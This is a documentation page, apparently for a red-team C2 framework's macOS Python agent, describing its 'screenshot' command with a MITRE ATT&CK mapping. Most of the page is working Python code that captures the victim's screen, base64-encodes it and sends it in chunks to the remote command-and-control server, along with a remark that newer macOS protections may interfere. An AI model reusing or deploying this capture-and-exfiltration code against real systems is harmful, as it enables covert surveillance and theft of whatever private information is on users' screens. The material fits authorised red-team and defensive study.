+++
title = "screenshot"
chapter = false
weight = 100
hidden = false
+++

## Summary

Use the built-in CGDisplay API calls to capture the display and send it back over the C2 channel. 

- Python Versions Supported: 2.7
- Needs Admin: False  
- Version: 1  
- Author: @ajpc500

## Usage

```
screenshot
```

## MITRE ATT&CK Mapping

- T1113  

## Detailed Summary

This uses API calls to read the current screen the return it to Mythic. This doesn't currently capture _all_ screens though.

```Python
    def screenshot(self, task_id):
        from Cocoa import NSURL, NSBitmapImageRep
        import LaunchServices
        import Quartz
        import Quartz.CoreGraphics as CG
        region = CG.CGRectInfinite
        image = CG.CGWindowListCreateImage(region, CG.kCGWindowListOptionOnScreenOnly, CG.kCGNullWindowID, CG.kCGWindowImageDefault)
        sh_data = CG.CFDataCreateMutable(None, 0)
        dest = Quartz.CGImageDestinationCreateWithData(sh_data, LaunchServices.kUTTypePNG, 1, None)
        file_size = 0
        if(dest):
            Quartz.CGImageDestinationAddImage (dest, image, 0)
            if (Quartz.CGImageDestinationFinalize(dest)):
                file_size = CG.CFDataGetLength(sh_data)

        if(file_size) > 0:
            total_chunks = int(file_size / CHUNK_SIZE) + (file_size % CHUNK_SIZE > 0)
            data = {
                "action": "post_response", 
                "responses": [
                {
                    "task_id": task_id,
                    "total_chunks": total_chunks,
                    "file_path": str(datetime.now()),
                    "chunk_size": CHUNK_SIZE,
                    "is_screenshot": True 
                }]
            }
            initial_response = self.postMessageAndRetrieveResponse(data)
            for i in range(0,total_chunks):
                if [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]:
                    return "Job stopped."

                if i == total_chunks:
                    content = sh_data[i*CHUNK_SIZE:]
                else:
                    content = sh_data[i*CHUNK_SIZE:(i+1)*CHUNK_SIZE]
                data = {
                    "action": "post_response", 
                    "responses": [
                        {
                            "chunk_num": i+1,
                            "file_id": initial_response["responses"][0]["file_id"],
                            "chunk_data": base64.b64encode(content),
                            "task_id": task_id                        
                        }
                    ]
                }
                response = self.postMessageAndRetrieveResponse(data)

```

The screencapture is chunked and sent back to Mythic.

>**NOTE** With 10.15, there are protections against this, so be careful

